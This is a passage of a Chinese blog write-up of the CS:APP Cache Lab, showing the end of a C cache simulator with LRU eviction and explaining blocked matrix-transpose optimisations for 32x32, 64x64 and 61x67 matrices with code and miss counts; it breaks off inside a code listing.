class="keyword">mem_addr_t</span> set_index = (addr &gt;&gt; b) &amp; set_index_mask;</span><br><span class="line">true<span class="keyword">mem_addr_t</span> tag = addr &gt;&gt; (s+b);</span><br><span class="line">true<span class="keyword">cache_set_t</span> <span class="built_in">set</span> = cache[set_index];</span><br><span class="line">true<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> eviction_lru = ULLONG_MAX;</span><br><span class="line">true<span class="keyword">int</span> eviction_line = <span class="number">0</span>;</span><br><span class="line">true<span class="keyword">int</span> i;</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="built_in">set</span>[i].valid == <span class="number">1</span> &amp;&amp; <span class="built_in">set</span>[i].tag == tag) &#123;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].lru = lru_counter++;</span><br><span class="line">truetruetruehit_count++;</span><br><span class="line">truetruetrue<span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">truetruetrue<span class="keyword">return</span>;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">truemiss_count++;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">true<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="built_in">set</span>[i].valid == <span class="number">0</span>) &#123;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].valid = <span class="number">1</span>;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].tag = tag;</span><br><span class="line">truetruetrue<span class="built_in">set</span>[i].lru = lru_counter++;</span><br><span class="line">truetruetrue<span class="keyword">return</span>;</span><br><span class="line">truetrue&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>[i].lru &lt; eviction_lru) &#123;</span><br><span class="line">truetruetrueeviction_lru = <span class="built_in">set</span>[i].lru;</span><br><span class="line">truetruetrueeviction_line = i;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueeviction_count++;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].valid = <span class="number">1</span>;</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].tag = tag;</span><br><span class="line">true<span class="built_in">set</span>[eviction_line].lru = lru_counter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * replayTrace - replays the given trace file against the cache </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">char</span>* trace_fn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">mem_addr_t</span> addr=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    FILE* trace_fp = fopen(trace_fn, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!trace_fp)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: %s\n&quot;</span>, trace_fn, strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( fgets(buf, <span class="number">1000</span>, trace_fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">1</span>]==<span class="string">&#x27;S&#x27;</span> || buf[<span class="number">1</span>]==<span class="string">&#x27;L&#x27;</span> || buf[<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf+<span class="number">3</span>, <span class="string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">if</span>(verbosity)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c %llx,%u &quot;</span>, buf[<span class="number">1</span>], addr, len);</span><br><span class="line"></span><br><span class="line">            accessData(addr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If the instruction is R/W then access again */</span></span><br><span class="line">            <span class="keyword">if</span>(buf[<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">                accessData(addr);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (verbosity)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(trace_fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * printUsage - Print usage info</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -h         Print this help message.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nExamples:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - Main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( (c=getopt(argc,argv,<span class="string">&quot;s:E:b:t:vh&quot;</span>)) != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            trace_file = optarg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbosity = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printUsage(argv);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printUsage(argv);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure that all required command line args were specified */</span></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="number">0</span> || E == <span class="number">0</span> || b == <span class="number">0</span> || trace_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        printUsage(argv);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute S, E and B from command line args */</span></span><br><span class="line">    S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">trueB = <span class="number">1</span> &lt;&lt; b;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Initialize cache */</span></span><br><span class="line">    initCache();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG_ON</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DEBUG: S:%u E:%u B:%u trace:%s\n&quot;</span>, S, E, B, trace_file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DEBUG: set_index_mask: %llu\n&quot;</span>, set_index_mask);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    replayTrace(trace_file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free allocated memory */</span></span><br><span class="line">    freeCache();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the hit and miss statistics for the autograder */</span></span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果与csim-ref一致：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529151718449.png" alt="image-20210529151718449"></p><h2 id="优化矩阵转置操作"><a href="#优化矩阵转置操作" class="headerlink" title="优化矩阵转置操作"></a>优化矩阵转置操作</h2><p>参考：<a href="https://zhuanlan.zhihu.com/p/33846811">《深入理解计算机系统》配套实验：Cache Lab</a></p><p>要求：</p><ol><li>一共只准使用不超过 12 个 int 类型局部变量</li><li>不能用递归</li><li>不准改变 A 数组的内容</li><li>不能定义新的数组也不能用 malloc 函数开辟空间。</li></ol><p>最终要使得 cache miss 的次数尽可能少。</p><p>思考：</p><p>最终在参考模拟器csim-ref模拟1KB 直接映射、块大小32Bytes的cache（参数s=5、E=1、b=5）上测试访存轨迹文件。</p><p>b = 5 代表一个块可以容纳 2^5 = 32个字节，即8个int类型数据。而<strong>因为数组在内存中是按行存储的，故选取块的时候也是按行。</strong>每个数组元素的set_index位在b个偏移位前，这意味着每8个连续的数组元素会映射到同一个set。</p><h2 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h2><p>在 32 x 32的矩阵中，一行有4 个 cache 行，所以 cache 一共可以存矩阵的 8 行。故使用分块技术，每次处理矩阵的一个8*8分块。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210606133458231.png" alt="image-20210606133458231"></p><p>但简单的分块还不足以达到要求。</p><p>过程中可以看生成的trace文件，用模拟器 -v选项运行，了解每次miss是怎么发生的。</p><p>A和B中对应的元素都是映射到同一行的。在加载A的第二行之后，在将A[2][2]传送给B[2][2]的时候，就发生了冲突——A的第二行被替换掉了。当然，过了一会，A的第二行又回来了。</p><p>进一步观察会发现，这种冲突只会发生在处理对角线的块上。于是选择用临时变量将数据保存起来，这样就不用担心抖动问题。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529192945830.png" alt="image-20210529192945830"></p><p>结果小于300，符合要求。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200725774.png" alt="image-20210529200725774"></p><h2 id="64-x-64"><a href="#64-x-64" class="headerlink" title="64 x 64"></a>64 x 64</h2><p>因为矩阵一行的元素数量翻倍，cache能够装载的行数减半（4行），若继续使用8*8的分块，会在分块内产生冲突。</p><img src="/2021/computer-architecture-hitlabs/image-20210606133606510.png" alt="image-20210606133606510" style="zoom: 80%;"><p>故改为4*4的分块。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529194253972.png" alt="image-20210529194253972"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200829892.png" alt="image-20210529200829892"></p><p>结果没有达到满分，还需要继续优化：（参考：<a href="https://zhuanlan.zhihu.com/p/42754565">《深入理解计算机系统》配套实验4: Cache lab</a> &amp; <a href="https://www.cnblogs.com/liqiuhao/p/8026100.html">CS:APP3e 深入理解计算机系统_3e CacheLab实验</a>)</p><p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p><p>如果只用<code>4×4</code>的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，这个方法最少也只能做到1677次miss。</p><p>题目说不能对A进行操作，但是可以<strong>对B进行操作</strong>！将B作为缓存使用</p><p><strong>改进方法</strong>：将<code>8 * 8</code> 块再分成4个<code>4 * 4</code>的块进一步处理，经过改进，达到1171miss</p><p>首先对左上角和右上角进行处理：</p><ol><li>B左上角 = A左上角转置。B右上角=A右上角转置。</li><li>我们最后只需要把这部分平移到B的左下角就好。</li></ol><p>现在B左上角完成</p><ol><li>首先用四个变量存储A的左下角的一列。</li><li>再用四个变量存储B的右上角的一行。</li><li>把四个变量存储的A的左下角的一列移动到B右上角的一行</li><li>把四个变量存储的B的右上角的一行平移到B左下角的一列</li><li>B的右下角=A的右下角转置</li></ol><p>关键的操作在第二步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">            a0 = A[k][j];</span><br><span class="line">            a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[j][k] = a0;</span><br><span class="line">            B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">            B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">            B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line"></span><br><span class="line">            B[j][k + <span class="number">4</span>] = a4;</span><br><span class="line">            B[j + <span class="number">1</span>][k + <span class="number">4</span>] = a5;</span><br><span class="line">            B[j + <span class="number">2</span>][k + <span class="number">4</span>] = a6;</span><br><span class="line">            B[j + <span class="number">3</span>][k + <span class="number">4</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (l = j + <span class="number">4</span>; l &lt; j + <span class="number">8</span>; l++) &#123;</span><br><span class="line"></span><br><span class="line">            a4 = A[i + <span class="number">4</span>][l - <span class="number">4</span>]; <span class="comment">// A left-down col</span></span><br><span class="line">            a5 = A[i + <span class="number">5</span>][l - <span class="number">4</span>];</span><br><span class="line">            a6 = A[i + <span class="number">6</span>][l - <span class="number">4</span>];</span><br><span class="line">            a7 = A[i + <span class="number">7</span>][l - <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">            a0 = B[l - <span class="number">4</span>][i + <span class="number">4</span>]; <span class="comment">// B right-above line</span></span><br><span class="line">            a1 = B[l - <span class="number">4</span>][i + <span class="number">5</span>];</span><br><span class="line">            a2 = B[l - <span class="number">4</span>][i + <span class="number">6</span>];</span><br><span class="line">            a3 = B[l - <span class="number">4</span>][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">4</span>] = a4; <span class="comment">// set B right-above line </span></span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">5</span>] = a5;</span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">6</span>] = a6;</span><br><span class="line">            B[l - <span class="number">4</span>][i + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            B[l][i] = a0;         <span class="comment">// set B left-down col</span></span><br><span class="line">            B[l][i + <span class="number">1</span>] = a1;</span><br><span class="line">            B[l][i + <span class="number">2</span>] = a2;</span><br><span class="line">            B[l][i + <span class="number">3</span>] = a3;</span><br><span class="line"></span><br><span class="line">            B[l][i + <span class="number">4</span>] = A[i + <span class="number">4</span>][l];</span><br><span class="line">            B[l][i + <span class="number">5</span>] = A[i + <span class="number">5</span>][l];</span><br><span class="line">            B[l][i + <span class="number">6</span>] = A[i + <span class="number">6</span>][l];</span><br><span class="line">            B[l][i + <span class="number">7</span>] = A[i + <span class="number">7</span>][l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果：1171miss 通过。</p><p>普通的4x4分块法会是这样的(箭头表示读入/写入方向)</p><p><img src="/2021/computer-architecture-hitlabs/v2-46ad0a6f9238a15c56205ca80b5a08f3_r.jpg" alt="img"></p><p>但是这样有个问题,因为每间隔4行,cache行就会被覆盖,所以写入b’的时候回造成严重的缓存浪费,所以我们考虑现将b’放到原c’的位置,也就是b’和c’互换位置,之后再交换回来,如下图所示</p><p><img src="/2021/computer-architecture-hitlabs/v2-a6ea648f5be8b37d31098018447a434a_r.jpg" alt="img"></p><p>但是使用这种方法仍然是拿不到满分的,还要继续进行优化,我们想办法在存入c’的时候直接将b’复原,并且要合理利用cache</p><p>我们可以使用逆序存储来实现这一点,如图所示</p><ul><li>逆序存放</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-f8a4f50fd07ec0e5cea7bd6aa3bf6266_r.jpg" alt="img"></p><ul><li>逆序读取</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-ec54f0eb4fb152c6e4e33e43d7256472_r.jpg" alt="img"></p><ul><li>最终</li></ul><p><img src="/2021/computer-architecture-hitlabs/v2-04505f122f41b8ac5ace1d83710f6649_r.jpg" alt="img"></p><p>原先存放的是1,2,3,4的数据,逆序存储的话就变成了4,3,2,1。</p><p>那么这样有什么好处呢?</p><ul><li>考虑一下开始读入c时候的情况</li></ul><p>此时cache中存放有全部的b’的数据,<strong>如果数据不是逆序存放的话</strong>,c’, d’第一行的缓存会覆盖掉b’第一行的缓存,此时再读入b’第一行准备放到c’第一行时就会miss了。反正,如<strong>果数据是逆序存放的话</strong>,因为只覆盖了b’第一行的缓存,但是我们要读入的是b’第4行的数据,而b’第4行的数据仍然在缓存中,这样就能hit了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value0, value1, value2, value3, value4, value5, value6, value7;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">                value0 = A[k][j];</span><br><span class="line">                value1 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                value2 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                value3 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                value4 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                value5 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                value6 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                value7 = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// a</span></span><br><span class="line">                B[j][k] = value0;</span><br><span class="line">                B[j+<span class="number">1</span>][k] = value1;</span><br><span class="line">                B[j+<span class="number">2</span>][k] = value2;</span><br><span class="line">                B[j+<span class="number">3</span>][k] = value3;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// b 逆序放置</span></span><br><span class="line">                B[j+<span class="number">0</span>][k+<span class="number">4</span>] = value7;</span><br><span class="line">                B[j+<span class="number">1</span>][k+<span class="number">4</span>] = value6;</span><br><span class="line">                B[j+<span class="number">2</span>][k+<span class="number">4</span>] = value5;</span><br><span class="line">                B[j+<span class="number">3</span>][k+<span class="number">4</span>] = value4;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">4</span>; h++) &#123;</span><br><span class="line">                value0 = A[i+<span class="number">4</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value1 = A[i+<span class="number">5</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value2 = A[i+<span class="number">6</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value3 = A[i+<span class="number">7</span>][j+<span class="number">3</span>-h];</span><br><span class="line">                value4 = A[i+<span class="number">4</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value5 = A[i+<span class="number">5</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value6 = A[i+<span class="number">6</span>][j+<span class="number">4</span>+h];</span><br><span class="line">                value7 = A[i+<span class="number">7</span>][j+<span class="number">4</span>+h];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// b&#x27;到c&#x27;(左下角)</span></span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">0</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">4</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">1</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">5</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">2</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">6</span>];</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">3</span>] = B[j+<span class="number">3</span>-h][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 存放c, d</span></span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">4</span>] = value0;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">5</span>] = value1;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">6</span>] = value2;</span><br><span class="line">                B[j+<span class="number">3</span>-h][i+<span class="number">7</span>] = value3;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">4</span>] = value4;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">5</span>] = value5;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">6</span>] = value6;</span><br><span class="line">                B[j+<span class="number">4</span>+h][i+<span class="number">7</span>] = value7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1243</p><p>另一种优化方案：（参考<a href="https://blog.csdn.net/weixin_45406155/article/details/112510369">哈工大计算机系统实验六——高速缓冲器模拟</a> &amp; <a href="https://zhuanlan.zhihu.com/p/28585726">CS:APP配套实验4：Cache Lab笔记</a>)</p><p>还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p><p>思路：每次处理一个块，也就是像32x32那样取出每行的8个元素，然后将 每行的0-3号元素正常的放到B[0-3][0]这些位置去（也就是正常的转置),剩下的四个元先放置B矩阵4x4块的最右边保存，注意这个时候我已经取出来了。然后再用一个循环去把这些值放到B正确的位置去，然后A[4]到A[7]也是上述的处理。对整个矩阵重复这个操作即可。简单的示意图如下：</p><p><img src="/2021/computer-architecture-hitlabs/20210112105734212.png" alt="img"></p><p><img src="/2021/computer-architecture-hitlabs/v2-85af81ad19187208673aacbb0cb42f69_r.jpg" alt="img"></p><p>画的线的分割是读入到Cache中的行以及写入到B中的顺序。（第二步有些画错了，A左下角应该是按列取数据）</p><ol><li><p>先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p></li><li><p>接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p></li></ol><p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p><ol start="3"><li>最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</li></ol><p><img src="/2021/computer-architecture-hitlabs/20210112105745141.png" alt="img"></p><p><img src="/2021/computer-architecture-hitlabs/20210112105757204.png" alt="img"></p><h2 id="61-x-67"><a href="#61-x-67" class="headerlink" title="61 x 67"></a>61 x 67</h2><p>尝试不同的分块，16*16可以达到要求。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529195537198.png" alt="image-20210529195537198"></p><p>结果：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210529200920477.png" alt="image-20210529200920477"></p><p>或者：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 